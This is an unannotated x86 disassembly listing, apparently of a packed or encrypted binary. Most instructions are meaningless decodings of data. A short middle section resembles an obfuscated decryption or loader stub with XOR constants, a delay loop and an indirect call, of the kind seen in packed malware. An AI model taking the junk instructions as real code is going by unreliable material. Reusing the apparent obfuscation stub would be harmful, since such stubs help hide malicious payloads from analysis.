  408aaa:	bound  esp,QWORD PTR [edi-0x3715415]
  408ab0:	cmp    BYTE PTR [ebx],0x36
  408ab3:	call   0xe5af78d3
  408ab8:	and    eax,0xd31a5861
  408abd:	mov    ch,0x2d
  408abf:	dec    edx
  408ac0:	mov    ds:0xa4513cff,eax
  408ac5:	or     al,0x4c
  408ac8:	jo     0x408a53
  408aca:	call   0xa8ebc068
  408acf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408ad0:	cmpxchg BYTE PTR [edx-0x6a],dh
  408ad4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408ad5:	xor    eax,0xfd394161
  408ada:	jne    0x408af9
  408adc:	sbb    DWORD PTR [ebp-0x2ec72761],0x8e808449
  408ae6:	mov    ah,0xb0
  408ae8:	lods   al,BYTE PTR ds:[esi]
  408ae9:	mov    dl,0x21
  408aeb:	mov    WORD PTR [ebp-0x4b],ds
  408aee:	mov    al,ds:0x2b6d4311
  408af3:	enter  0x479f,0x68
  408af7:	popa   
  408af8:	fs icebp 
  408afa:	cwde   
  408afb:	mov    dl,0x51
  408afd:	dec    esi
  408afe:	push   es
  408aff:	jb     0x408b7e
  408b01:	inc    eax
  408b02:	mov    ebx,0x8ca139f2
  408b07:	mov    edi,0x3f942555
  408b0c:	out    dx,al
  408b0d:	fist   DWORD PTR [ecx-0x2e7c5139]
  408b13:	jg     0x408b8e
  408b15:	fimul  WORD PTR [esi+0x18]
  408b18:	jno    0x408abf
  408b1a:	sub    ah,bl
  408b1c:	jmp    0x1316:0x37201e8b
  408b23:	add    al,0x59
  408b25:	push   esi
  408b26:	push   ebp
  408b27:	push   edx
  408b28:	cwde   
  408b29:	enter  0x74c6,0xc9
  408b2d:	or     eax,0x4c86694a
  408b32:	cmp    eax,0xe7ddbc9e
  408b37:	dec    ebx
  408b38:	ret    0xfa7a
  408b3b:	loope  0x408ae0
  408b3d:	je     0x408b48
  408b3f:	mul    DWORD PTR [ebx+0x63f30ed5]
  408b45:	ret    
  408b46:	fwait
  408b47:	test   eax,0x6c3685e3
  408b4c:	jnp    0x408b5d
  408b4e:	jnp    0x408bc9
  408b50:	mov    ecx,0x82635e81
  408b55:	rcr    BYTE PTR [eax+edi*4+0x7a],cl
  408b59:	and    al,0x9d
  408b5b:	push   0xfffffff5
  408b5d:	sub    ebx,DWORD PTR [edi-0x49]
  408b60:	daa    
  408b61:	lods   al,BYTE PTR ds:[esi]
  408b62:	data16 sub bl,BYTE PTR [ebp-0x2]
  408b66:	loope  0x408b97
  408b68:	pop    ecx
  408b69:	xor    bl,BYTE PTR [ebp+0x1f]
  408b6c:	or     al,0x33
  408b6e:	pop    ebx
  408b6f:	pop    eax
  408b70:	out    0x94,eax
  408b72:	std    
  408b73:	pushf  
  408b74:	js     0x408b35
  408b76:	rol    DWORD PTR [edx],0x90
  408b79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b7a:	dec    edx
  408b7b:	mov    dh,0xd
  408b7d:	mov    dh,0x94
  408b7f:	fwait
  408b80:	outs   dx,DWORD PTR ds:[esi]
  408b81:	mov    esp,0x350c70a
  408b86:	mov    eax,ebx
  408b88:	mov    esi,0x383e740c
  408b8d:	add    DWORD PTR [edi-0x2d],esp
  408b90:	dec    ebx
  408b91:	pop    ebp
  408b92:	or     al,0x12
  408b94:	dec    ebx
  408b95:	addr16 push cs
  408b97:	iret   
  408b98:	push   eax
  408b99:	sub    eax,0x83faaeb4
  408b9e:	paddd  mm1,QWORD PTR gs:[esp+esi*8]
  408ba3:	sub    bp,si
  408ba6:	jl     0x408b5d
  408ba8:	pop    edi
  408ba9:	inc    BYTE PTR [ebp-0x5f]
  408bac:	daa    
  408bad:	mov    ah,0x28
  408baf:	adc    esp,ebp
  408bb1:	fmul   st,st(4)
  408bb3:	add    esp,DWORD PTR [ebp-0x439d263d]
  408bb9:	fisttp QWORD PTR [edx]
  408bbb:	sbb    eax,0xc2fb6749
  408bc0:	dec    ebp
  408bc1:	pop    ecx
  408bc2:	cli    
  408bc3:	dec    ebx
  408bc4:	xchg   esp,eax
  408bc5:	mov    dl,ah
  408bc7:	(bad)  
  408bc8:	fdivr  DWORD PTR [ebx]
  408bca:	xor    dl,BYTE PTR [eax-0x4c]
  408bcd:	shl    BYTE PTR [edx-0x754b26e8],cl
  408bd3:	adc    dl,BYTE PTR [ecx]
  408bd5:	or     eax,0xf4ffe84a
  408bda:	pop    ebp
  408bdb:	rcpss  xmm7,xmm0
  408bdf:	stos   DWORD PTR es:[edi],eax
  408be0:	mov    BYTE PTR [esi-0x53c54e83],cl
  408be6:	sub    esi,DWORD PTR [ebp+0x209dba9f]
  408bec:	in     eax,dx
  408bed:	sub    BYTE PTR [esi+eiz*1+0x61b10cc5],0xfc
  408bf5:	inc    ecx
  408bf6:	fiadd  WORD PTR [esi-0x6c]
  408bf9:	mov    esp,0xc5eb5674
  408bfe:	mov    eax,0x6d3a75c3
  408c03:	xlat   BYTE PTR ds:[ebx]
  408c04:	imul   edi,DWORD PTR [ecx-0x72],0xd2c02fde
  408c0b:	dec    esi
  408c0c:	cdq    
  408c0d:	sbb    BYTE PTR [ecx],dh
  408c0f:	(bad)  
  408c11:	fwait
  408c12:	jno    0x408bea
  408c14:	mov    edx,0x608b8cfb
  408c19:	in     al,0xdd
  408c1b:	mov    al,ds:0xe2bc91bf
  408c20:	(bad)  
  408c21:	xchg   ecx,eax
  408c22:	push   ss
  408c23:	sbb    BYTE PTR [ebx+ebp*1+0x27],ah
  408c27:	push   0x43dfde6
  408c2c:	fstp   QWORD PTR [esi+0x5024eaed]
  408c32:	mov    eax,0xebf07459
  408c37:	mov    ecx,0x5baacd90
  408c3c:	mov    esi,0x58b3c345
  408c41:	rol    DWORD PTR [edi-0x52dc61ec],1
  408c47:	or     al,0x9e
  408c49:	popa   
  408c4a:	test   al,0xd3
  408c4c:	repz add ebx,DWORD PTR [ecx-0x72c5d27c]
  408c53:	lods   al,BYTE PTR ds:[esi]
  408c54:	jg     0x408be7
  408c56:	sub    eax,0xbe58f77e
  408c5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408c5c:	leave  
  408c5d:	push   ebx
  408c5e:	daa    
  408c5f:	aad    0xef
  408c61:	popa   
  408c62:	in     al,0x44
  408c64:	push   es
  408c65:	inc    edi
  408c66:	ror    BYTE PTR [edx+ebp*4-0x50ac0074],1
  408c6d:	arpl   WORD PTR [ecx+eiz*8],cx
  408c70:	lahf   
  408c71:	pop    edi
  408c72:	mov    edx,0xa1b524ae
  408c77:	jae    0x408c30
  408c79:	and    al,0x1d
  408c7b:	dec    edx
  408c7c:	and    eax,0x4223c179
  408c81:	cmp    edx,ebp
  408c83:	push   edx
  408c84:	mov    ds:0x84ff85fb,al
  408c89:	std    
  408c8a:	ds fwait
  408c8c:	push   0xa19f177c
  408c91:	pop    edx
  408c92:	icebp  
  408c93:	rol    DWORD PTR [esi+0x6e],cl
  408c96:	repz push es
  408c98:	popa   
  408c99:	pusha  
  408c9a:	jecxz  0x408d00
  408c9c:	jl     0x408cd6
  408c9e:	stc    
  408c9f:	xchg   edi,eax
  408ca0:	xchg   esi,eax
  408ca1:	pop    edi
  408ca2:	repz ds add al,0xac
  408ca6:	push   ebx
  408ca7:	inc    edi
  408ca8:	inc    esp
  408ca9:	and    BYTE PTR [ebx],bl
  408cab:	pop    eax
  408cac:	adc    cl,dh
  408cae:	mov    al,0x70
  408cb0:	and    BYTE PTR ss:[ecx+0x1cf2cd8e],bl
  408cb7:	dec    ecx
  408cb8:	sbb    dl,ch
  408cba:	pop    esi
  408cbb:	data16 mov es,WORD PTR [edx]
  408cbe:	jno    0x408cda
  408cc0:	fwait
  408cc1:	je     0x408cd8
  408cc3:	xchg   BYTE PTR [ebx],dl
  408cc5:	xor    ebp,DWORD PTR [eax]
  408cc7:	push   cs
  408cc8:	and    eax,0x90067d9b
  408ccd:	mov    bh,0x4b
  408ccf:	ja     0x408d0b
  408cd1:	in     eax,dx
  408cd2:	sub    BYTE PTR [eax+0x547b1fb9],al
  408cd8:	fsub   st,st(4)
  408cda:	xchg   ebp,eax
  408cdb:	fst    DWORD PTR [ebx+0x18]
  408cde:	shl    BYTE PTR [edx-0x66],1
  408ce1:	inc    esi
  408ce2:	push   edx
  408ce3:	pusha  
  408ce4:	mov    eax,0x7964e6b9
  408ce9:	mov    ds:0x2dfada4,al
  408cee:	jge    0x408cc3
  408cf0:	xchg   ebp,eax
  408cf1:	pop    ebp
  408cf2:	mov    WORD PTR [esi+edx*8-0x1dff596f],?
  408cf9:	stos   BYTE PTR es:[edi],al
  408cfa:	xchg   BYTE PTR [eax+0x2be652b3],cl
  408d00:	(bad)  
  408d01:	loopne 0x408d2f
  408d03:	sub    cl,BYTE PTR [edi]
  408d05:	test   DWORD PTR [ecx-0x24],eax
  408d08:	(bad)  
  408d09:	dec    DWORD PTR [ebx+0x5e9c6]
  408d0f:	add    BYTE PTR [eax],al
  408d11:	mov    eax,0x3272db
  408d16:	mov    ebx,0x7510893
  408d1b:	mov    ecx,DWORD PTR [ebp-0x4]
  408d1e:	xor    ecx,ebx
  408d20:	add    ecx,eax
  408d22:	mov    DWORD PTR [ebp-0xc],ecx
  408d25:	mov    ebx,0x65655
  408d2a:	add    ebx,0x3234
  408d30:	xchg   ebx,esi
  408d32:	xor    ebx,ebx
  408d34:	push   esi
  408d35:	mov    esi,ebx
  408d37:	pop    ebx
  408d38:	mov    edx,esi
  408d3a:	add    ebx,0x1002
  408d40:	lea    eax,[ebp-0x10]
  408d43:	add    edx,eax
  408d45:	add    edx,0x5
  408d48:	push   edx
  408d49:	inc    esi
  408d4a:	pop    ecx
  408d4b:	dec    ecx
  408d4c:	xchg   ecx,eax
  408d4d:	dec    eax
  408d4e:	xchg   ecx,eax
  408d4f:	dec    ecx
  408d50:	xchg   ecx,edx
  408d52:	dec    edx
  408d53:	push   edx
  408d54:	mov    edx,ebx
  408d56:	pop    ebx
  408d57:	dec    ebx
  408d58:	call   DWORD PTR [ebx]
  408d5a:	cmp    DWORD PTR [ebp+0x10],esi
  408d5d:	je     0x408d7c
  408d63:	xchg   edx,eax
  408d64:	push   0xb
  408d66:	pop    ecx
  408d67:	push   0x4
  408d69:	pop    ebx
  408d6a:	inc    ebx
  408d6b:	xchg   ebx,ecx
  408d6d:	sub    ebx,ecx
  408d6f:	xchg   ebx,ecx
  408d71:	dec    ecx
  408d72:	dec    ecx
  408d73:	mov    eax,DWORD PTR [ebp-0x1c]
  408d76:	imul   eax,ecx
  408d79:	add    esp,eax
  408d7b:	xchg   edx,eax
  408d7c:	push   eax
  408d7d:	xor    ebx,ebx
  408d7f:	mov    edx,esp
  408d81:	dec    edx
  408d82:	inc    ebx
  408d83:	add    ebx,DWORD PTR [edx+ebx*1]
  408d86:	dec    ebx
  408d87:	xor    edx,edx
  408d89:	add    DWORD PTR [ebp-0xc],ebx
  408d8c:	pop    ebx
  408d8d:	mov    eax,DWORD PTR [ebp-0xc]
  408d90:	pop    edi
  408d91:	pop    esi
  408d92:	pop    ebx
  408d93:	leave  
  408d94:	ret    0x10
  408d97:	push   ebp
  408d98:	mov    ebp,esp
  408d9a:	push   ecx
  408d9b:	xor    ecx,ecx
  408d9d:	xor    ecx,DWORD PTR ds:0x42600c
  408da3:	and    DWORD PTR ds:0x426014,ecx
  408da9:	mov    DWORD PTR [ebp-0x4],0xf89c85ba
  408db0:	mov    eax,DWORD PTR [ebp-0x4]
  408db3:	sub    edx,edx
  408db5:	mov    edx,DWORD PTR [ebp+0x10]
  408db8:	and    DWORD PTR ds:0x427014,ebx
  408dbe:	mov    ecx,0x7510893
  408dc3:	xor    eax,ecx
  408dc5:	add    eax,0x3272db
  408dca:	mov    DWORD PTR [edx],eax
  408dcc:	mov    DWORD PTR ds:0x426008,0x4f8c
  408dd6:	mov    eax,DWORD PTR [ebp+0xc]
  408dd9:	sbb    DWORD PTR ds:0x425020,0x2880
  408de3:	xor    eax,ecx
  408de5:	and    DWORD PTR ds:0x429008,0x0
  408def:	mov    edx,DWORD PTR ds:0x429008
  408df5:	inc    edx
  408df6:	mov    DWORD PTR ds:0x429008,edx
  408dfc:	cmp    DWORD PTR ds:0x429008,0x17
  408e03:	jne    0x408e19
  408e09:	push   0x41ffb1
  408e0e:	push   0x391b
  408e13:	call   DWORD PTR ds:0x421008
  408e19:	cmp    DWORD PTR ds:0x429008,0x15
  408e20:	jb     0x408def
  408e26:	xor    DWORD PTR ds:0x42700c,edi
  408e2c:	push   esi
  408e2d:	mov    esi,DWORD PTR [ebp+0x10]
  408e30:	mov    edx,0x3272db
  408e35:	add    eax,edx
  408e37:	mov    DWORD PTR [esi+0x4],eax
  408e3a:	mov    eax,DWORD PTR [ebp+0x14]
  408e3d:	mov    esi,DWORD PTR [ebp+0x10]
  408e40:	mov    DWORD PTR [esi+0x8],eax
  408e43:	jmp    0x40b197
  408e48:	push   ebp
  408e49:	add    al,0x4c
  408e4b:	mov    al,ds:0x6365b8eb
  408e50:	add    eax,0xec3327cf
  408e55:	lock sub edi,ebp
  408e58:	mov    bl,BYTE PTR [ecx]
  408e5a:	bound  esp,QWORD PTR [edx+0x2b]
  408e5d:	pop    edi
  408e5e:	bound  esp,QWORD PTR [edx+0x27]
  408e61:	out    0xc4,al
  408e63:	push   ecx
  408e64:	xchg   al,cl
  408e66:	pop    ecx
  408e67:	sbb    al,0xd2
  408e69:	das    
  408e6a:	xchg   esp,eax
  408e6b:	enter  0x66cb,0xbc
  408e6f:	jp     0x408e50
  408e71:	fld    TBYTE PTR [ebp+0x4e]
  408e74:	mov    di,0xf612
  408e78:	jmp    0x9c3c786f
  408e7d:	in     al,dx
  408e7e:	icebp  
  408e7f:	push   ds
  408e80:	jbe    0x408ecb
  408e82:	or     DWORD PTR ds:0x6cede409,ebp
  408e88:	hlt    
  408e89:	fs or  eax,0x7f96afed
  408e8f:	ds mov dh,0xf6
  408e92:	rcr    DWORD PTR [ebx+0x10322aa],0xca
  408e99:	jnp    0x408ea6
  408e9b:	inc    edx
  408e9c:	and    dh,BYTE PTR [esi]
  408e9e:	push   cs
  408e9f:	ins    BYTE PTR es:[edi],dx
  408ea0:	les    edx,FWORD PTR [esi-0x1fc6d361]
  408ea6:	ret    0x7ec8
  408ea9:	dec    ecx
  408eaa:	test   eax,0xbd9ab351
  408eaf:	push   eax
  408eb0:	adc    DWORD PTR [eax-0x3a],edx
  408eb3:	jmp    0x7306:0xf6d1cfeb
  408eba:	xor    BYTE PTR [eax+0x721694a5],cl
  408ec0:	mov    ebp,0xfa7f2bfa
  408ec5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ec6:	outs   dx,BYTE PTR ds:[esi]
  408ec7:	mov    ds:0xbebee27b,eax
  408ecc:	jbe    0x408eeb
  408ece:	xchg   ecx,eax
  408ecf:	push   esp
  408ed0:	aam    0x24
  408ed2:	mov    ecx,0xe9ab184a
  408ed7:	mov    ebp,DWORD PTR [ebx-0x3]
  408eda:	mov    ecx,0x12837754
  408edf:	and    al,0x13
  408ee1:	push   ss
  408ee2:	into   
  408ee3:	out    dx,al
  408ee4:	fmul   QWORD PTR [ebp+0x45cd5b46]
  408eea:	jmp    0xacc85bdd
  408eef:	add    edx,DWORD PTR [ebp+edx*8+0x7]
  408ef3:	mov    ds:0x2cbf3fe4,eax
  408ef8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ef9:	cs pop ebp
  408efb:	int    0x63
  408efd:	push   ecx
  408efe:	xchg   ecx,eax
  408eff:	in     al,0x61
  408f01:	and    eax,0xfbbf2645
  408f06:	popf   
  408f07:	adc    eax,0xc999b380
  408f0c:	(bad)  
  408f0d:	jbe    0x408efb
  408f0f:	jmp    0x6c4a:0x4d8e853c
  408f16:	fbld   TBYTE PTR [edi]
  408f18:	aaa    
  408f19:	add    al,0xbe
  408f1b:	lods   al,BYTE PTR ds:[esi]
  408f1c:	or     esi,ebx
  408f1e:	dec    edx
  408f1f:	cwde   
  408f20:	sub    eax,0x8b428f8f
  408f25:	retf   
  408f26:	lock and bl,BYTE PTR [ebx]
  408f29:	(bad)  
  408f2a:	ficomp WORD PTR [ecx+0x805526f]
  408f30:	sub    ebp,ecx
  408f32:	xchg   ebx,eax
  408f33:	add    al,0x30
  408f35:	mov    eax,0x5f3aefa2
  408f3a:	push   ebx
  408f3b:	lock and eax,ebp
  408f3e:	jmp    0x408f1d
  408f40:	push   ds
  408f41:	adc    al,0xeb
  408f43:	xchg   ecx,eax
  408f44:	iret   
  408f45:	stos   DWORD PTR es:[edi],eax
  408f46:	cld    
  408f47:	ror    esp,0x9f
  408f4a:	push   ds
  408f4b:	cmp    ebp,DWORD PTR [ebx+0x56a083f6]
  408f51:	jmp    0x2417cc7a
  408f56:	xor    ecx,esp
  408f58:	call   0x86bb:0x8856202e
  408f5f:	pop    es
  408f60:	jns    0x408ef5
  408f62:	pop    esi
  408f63:	into   
  408f64:	cmp    ch,al
  408f66:	sbb    al,0xb4
  408f68:	mov    ss,WORD PTR [edx-0x5a]
  408f6b:	adc    dh,al
  408f6d:	add    al,0xed
  408f6f:	out    0xa0,al
  408f71:	aaa    
  408f72:	test   al,0x7
  408f74:	scas   al,BYTE PTR es:[edi]
  408f75:	adc    al,0x15
  408f77:	mov    BYTE PTR [eax+0x5b09995f],cl
  408f7d:	(bad)  
  408f80:	sub    eax,DWORD PTR [ebx+0x75]
  408f83:	insertq xmm6,(bad),0x78,0x36
  408f87:	mov    ch,0x31
  408f89:	mov    al,BYTE PTR [ecx]
  408f8b:	mov    ecx,0x3209697a
  408f90:	into   
  408f91:	xor    DWORD PTR [esi-0x27d6779b],ebx
  408f97:	and    bh,BYTE PTR [ebp-0x7f]
  408f9a:	(bad)  
  408f9b:	pop    edi
  408f9c:	cmp    BYTE PTR [eax+0x209b],dl
  408fa2:	rcl    BYTE PTR [ebx],cl
  408fa4:	push   ecx
  408fa5:	and    ebp,DWORD PTR [esi-0x1e]
  408fa8:	mov    edx,0xb2553027
  408fad:	iret   
  408fae:	aaa    
  408faf:	pop    es
  408fb0:	push   esp
  408fb1:	push   ss
  408fb2:	fsubr  QWORD PTR [edx]
  408fb4:	ficom  DWORD PTR [ebx-0x46a5eb97]
  408fba:	fisttp DWORD PTR [eax]
  408fbd:	pop    ss
  408fbe:	mov    dh,0x41
  408fc0:	xor    BYTE PTR ds:0x9e153682,ah
  408fc6:	or     al,0x35
  408fc8:	dec    edx
  408fc9:	add    ebp,ecx
  408fcb:	xchg   edi,eax
  408fcc:	push   eax
  408fcd:	mov    al,dh
  408fcf:	mov    ch,0xb1
  408fd1:	sahf   
  408fd2:	jle    0x40901c
  408fd4:	ja     0x408f69
  408fd6:	cmp    dh,BYTE PTR [edx+0x58]
  408fd9:	dec    esp
  408fda:	xor    eax,0xe44d4c36
  408fdf:	test   al,0x15
  408fe1:	and    eax,0x569c27e
  408fe6:	icebp  
  408fe7:	bound  ebx,QWORD PTR [edi-0x6a]
  408fea:	out    dx,al
  408feb:	out    0x1c,eax
  408fed:	aad    0x2e
  408fef:	in     eax,dx
  408ff0:	mov    al,ds:0x95aa4d5c
  408ff5:	mov    esi,0xfb9735
  408ffa:	sar    DWORD PTR [ecx],1
  408ffc:	jmp    0x35148efa
  409001:	xlat   BYTE PTR ds:[ebx]
  409002:	sub    al,0x42
  409004:	lods   al,BYTE PTR ds:[esi]
  409005:	mov    ebp,0xe73a2e96
  40900a:	test   DWORD PTR [ecx],esi
  40900c:	mov    esi,0x552db829
  409011:	retf   0x801e
  409014:	xor    BYTE PTR ds:0xa89182b1,cl
  40901a:	mov    bh,0x89
  40901c:	cmovge ebx,DWORD PTR [eax+0x6243e57f]
  409023:	xchg   ebx,eax
  409024:	mov    dh,0xd9
  409026:	mov    ebx,0x6a62ab39
  40902b:	sub    DWORD PTR [eax],ebp
  40902d:	aad    0xcd
  40902f:	test   dl,0x42
  409032:	push   cs
  409033:	jno    0x408fd6
  409035:	(bad)
  409038:	mul    ah
  40903a:	daa    
  40903b:	popf   
  40903c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40903d:	stos   BYTE PTR es:[edi],al
  40903e:	in     eax,dx
  40903f:	add    ebp,ecx
  409041:	inc    esi
  409042:	jg     0x409095
  409044:	push   ss
  409045:	fwait
  409046:	int3   
  409047:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409049:	pop    ebx
  40904a:	jne    0x409060
  40904c:	lods   eax,DWORD PTR ds:[esi]
  40904d:	int    0x3c
  40904f:	add    cl,BYTE PTR [eax-0x17]
  409052:	mov    eax,0x1dfd36c6
  409057:	sbb    BYTE PTR [eax],0x89
  40905a:	dec    ecx
  40905b:	xor    eax,0xef091b5
  409060:	pop    es
  409061:	adc    BYTE PTR [ebp+0x28],0x73
  409065:	jp     0x409049
  409067:	cmp    esp,DWORD PTR [esi]
  409069:	std    
  40906a:	out    dx,al
  40906b:	pop    ebx
  40906c:	cmp    ebx,DWORD PTR [ebx+0xabaa5d0]
  409072:	addr16 push ss
  409074:	addr16 push edx
  409076:	jmp    FWORD PTR [esp+ebp*2]
  409079:	cmp    eax,0x1745955b
  40907e:	add    al,0x6d
  409080:	adc    eax,0x9023c10e
  409085:	inc    ebp
  409086:	xor    DWORD PTR [eax+0xf318441],eax
  40908c:	and    ah,ch
  40908e:	bound  ebx,QWORD PTR [edx-0x15353ac9]
  409094:	cmp    ch,al
  409096:	cwde   
  409097:	inc    ebp
  409098:	xor    ebp,DWORD PTR [ebx]
  40909a:	and    DWORD PTR [ecx-0x48180af2],ebp
  4090a0:	dec    ecx
  4090a1:	cdq    
  4090a2:	out    0x5c,al
  4090a4:	dec    esp
  4090a5:	popf   
  4090a6:	sbb    DWORD PTR [esi],edi
  4090a8:	or     cl,BYTE PTR [ecx+0x60e6c7ee]
  4090ae:	pop    esp
  4090af:	xchg   ecx,eax
  4090b0:	inc    ebp
  4090b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4090b2:	data16 mov dl,0x1b
  4090b5:	mov    BYTE PTR [esi+0x48],bh
  4090b8:	xlat   BYTE PTR ds:[ebx]
  4090b9:	mov    al,ds:0xca29e9c
  4090be:	pop    ds
  4090bf:	and    edi,DWORD PTR [ebx-0x38]
  4090c2:	cmp    al,0x5a
  4090c4:	(bad)  
  4090c5:	into   
  4090c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4090c7:	inc    esi
  4090c8:	mov    dl,0x3
  4090ca:	ja     0x409059
  4090cc:	mov    dl,0xc6
  4090ce:	push   es
  4090cf:	aaa    
  4090d0:	inc    edi
  4090d1:	and    ebx,DWORD PTR [eax+0x5c]
  4090d4:	pop    esi
  4090d5:	ror    DWORD PTR [esi],cl
  4090d7:	cwde   
  4090d8:	or     al,0x3f
  4090da:	and    cl,BYTE PTR [edi]
  4090dc:	into   
  4090dd:	xchg   ebp,eax
  4090de:	xchg   edx,eax
  4090df:	pop    ecx
  4090e0:	xor    eax,0xc1e86a14
  4090e5:	inc    edx
  4090e6:	out    0xa5,eax
  4090e8:	mov    bl,0xd0
  4090ea:	pop    DWORD PTR [esi+0x5eb73653]
  4090f0:	stc    
  4090f1:	pop    edx
  4090f2:	xchg   edx,eax
  4090f3:	sbb    eax,0xaf8cbfef
  4090f8:	sub    eax,0x721e7b34
  4090fd:	jae    0x409087
  4090ff:	ror    DWORD PTR [esi+0x1a],0x1a
  409103:	mov    ss,WORD PTR [ebx-0x5711b860]
  409109:	mov    ch,0x8a
  40910b:	add    al,0x7f
  40910d:	and    esp,DWORD PTR [eax-0x7c]
  409110:	dec    ecx
  409111:	dec    esp
  409112:	pop    eax
  409113:	or     esp,DWORD PTR [esi]
  409115:	(bad)  
  409116:	ret    0x5946
  409119:	into   
  40911a:	popf   
  40911b:	pop    ss
  40911c:	fild   DWORD PTR [edi]
  40911e:	addr16 jns 0x4090ab
  409121:	mov    esi,0xbc515bca
  409126:	stc    
  409127:	and    ebx,DWORD PTR ds:0xe74ea53c
  40912d:	je     0x40914c
  40912f:	mov    eax,DWORD PTR [edi-0x2]
  409132:	in     eax,dx
  409133:	fwait
  409134:	sbb    eax,0xbff73bc4
  409139:	mov    bl,0x9
  40913b:	push   ss
  40913c:	in     al,dx
  40913d:	mov    ds:0xf3fe170d,eax
  409143:	mov    al,ds:0x9bf3c0cf
  409148:	mov    al,0x7c
  40914a:	pop    esp
  40914b:	imul   esi,DWORD PTR [ebx],0x5f59672e
  409151:	test   dl,bl
  409153:	mov    ?,WORD PTR ds:0x5d41be0b
  409159:	aam    0x25
  40915b:	sub    ebp,DWORD PTR [eax+eax*4+0x51]
  40915f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409160:	push   esi
  409161:	aam    0x1b
  409163:	mov    dh,0x7e
  409166:	lods   eax,DWORD PTR ds:[esi]
  409167:	imul   ebp,esi,0x6
  40916a:	and    al,0xf2
  40916c:	test   al,0xa6
  40916e:	and    al,0x47
  409170:	pop    ds
  409171:	popf   
  409172:	cmp    DWORD PTR [ecx-0x7fec946c],ebx
  409178:	and    eax,DWORD PTR [eax+0x77]
  40917b:	rcl    BYTE PTR [ebx],1
  40917d:	out    dx,al
  40917e:	sahf   
  40917f:	or     esp,DWORD PTR [ebx]
  409181:	test   eax,0xa09bdbbb
  409186:	sbb    al,cl
  409188:	xor    BYTE PTR [ebp+0x76],dh
  40918b:	xor    edi,DWORD PTR [esi+0x41]
  40918e:	dec    esp
  40918f:	or     BYTE PTR [ecx+0x8],ah
  409192:	pushf  
  409193:	mov    dl,0x3e
  409195:	loop   0x40917f
  409197:	push   eax
  409198:	pop    edi
  409199:	repnz idiv BYTE PTR [ecx+0x5eb6320d]
  4091a0:	aam    0x61
  4091a2:	sub    eax,0xd405ae0d
  4091a7:	leave  
  4091a8:	call   DWORD PTR [edi+0x17697f14]
  4091ae:	stos   BYTE PTR es:[edi],al
  4091af:	jb     0x40919a
  4091b1:	cmp    eax,0xd706c63a
  4091b6:	cs daa 
  4091b8:	inc    esi
  4091b9:	or     bh,dh
  4091bb:	mov    esp,0xf0bcf664
  4091c0:	mov    dl,0xbe
  4091c2:	mov    al,ds:0xd0fde1e8
  4091c7:	sti    
  4091c8:	jmp    0x8d0aa70c
  4091cd:	retf   0xd450
  4091d0:	push   ebx
  4091d1:	addr16 pop ss
  4091d3:	das    
  4091d4:	mov    esi,0xdc32bb0b
  4091d9:	sbb    al,0xaf
  4091db:	xlat   BYTE PTR ds:[ebx]
  4091dc:	jno    0x40917f
  4091de:	and    bl,BYTE PTR ds:0x266bf63a
  4091e4:	xchg   ebx,eax
  4091e5:	lahf   
  4091e6:	pusha  
  4091e7:	test   DWORD PTR [edi-0x1a],edi
  4091ea:	shl    BYTE PTR [edi+0x6bc9b7f0],1
  4091f0:	xchg   esp,eax
  4091f1:	and    DWORD PTR ds:0xcd154cf4,ecx
  4091f7:	add    dl,dl
  4091f9:	mov    BYTE PTR [esi+0x1be62a3],0xd0
  409200:	test   eax,0xe005aaee
  409205:	push   ecx
  409206:	xchg   edx,eax
  409207:	sti    
  409208:	aas    
  409209:	sbb    edx,eax
  40920b:	add    DWORD PTR [ebx-0x71],eax
  40920e:	mov    dh,0xef
  409210:	adc    al,0x46
  409212:	or     al,0xe4
  409214:	test   DWORD PTR [ecx],0xe272075c
  40921a:	test   al,0x19
  40921c:	adc    al,0x78
  40921e:	sub    bl,bl
  409220:	retf   
  409221:	mov    DWORD PTR [eax],0xd8fafa0a
  409227:	in     eax,0x1b
  409229:	push   0x5e
  40922b:	mov    cs,WORD PTR ds:0x655a8e6d
  409231:	fldcw  WORD PTR [eax]
  409233:	outs   dx,DWORD PTR ds:[esi]
  409234:	sub    edi,DWORD PTR [esi]
  409236:	sub    DWORD PTR [ebx+0x4381cbba],ebx
  40923c:	xchg   esp,eax
  40923d:	pop    ss
  40923e:	mov    eax,ds:0xaa81036b
  409243:	pop    edi
  409244:	stc    
  409245:	sub    eax,0x5dfc763a
  40924a:	cld    
  40924b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40924c:	sti    
  40924d:	(bad)  
  409250:	add    BYTE PTR [ecx-0x6fcf190c],al
  409256:	out    0xfc,al
  409258:	mov    eax,0xb1336c92
  40925d:	dec    ebx
  40925e:	jo     0x40921d
  409260:	sti    
  409261:	ja     0x40926b
  409263:	inc    ebx
  409264:	mov    edx,0x8bf942b1
  409269:	pushf  
  40926a:	ins    BYTE PTR es:[edi],dx
  40926b:	sub    esi,DWORD PTR [esi-0x6719ce6e]
  409271:	xchg   BYTE PTR [ebx],dl
  409273:	mov    ds:0x4eafd139,eax
  409278:	mov    esi,0x5536a2c7
  40927d:	xlat   BYTE PTR ds:[ebx]
  40927e:	imul   eax,DWORD PTR [ebx-0xb],0xffffffa5
  409282:	sbb    ebx,DWORD PTR [edi-0x56075097]
  409288:	pop    ds
  409289:	loop   0x4092ba
  40928b:	inc    ecx
  40928c:	shl    esi,cl
  40928e:	pop    ebx
  40928f:	mov    esi,es
  409291:	mul    BYTE PTR [esi-0x92d8a85]
  409297:	fwait
  409298:	std    
  409299:	jae    0x4092d4
  40929b:	jg     0x409314
  40929d:	bound  esp,QWORD PTR [ecx]
  40929f:	ret    
  4092a0:	retf   
  4092a1:	pop    edx
  4092a2:	rcl    BYTE PTR [ebp-0x5382244e],0x38
  4092a9:	outs   dx,BYTE PTR ds:[esi]
  4092aa:	shl    BYTE PTR [esi+0x1bb07a6c],0xb3
  4092b1:	pop    edx
  4092b2:	lock es jge 0x40931b
  4092b6:	push   ds
  4092b7:	je     0x4092d6
  4092b9:	xchg   BYTE PTR [ecx],ah
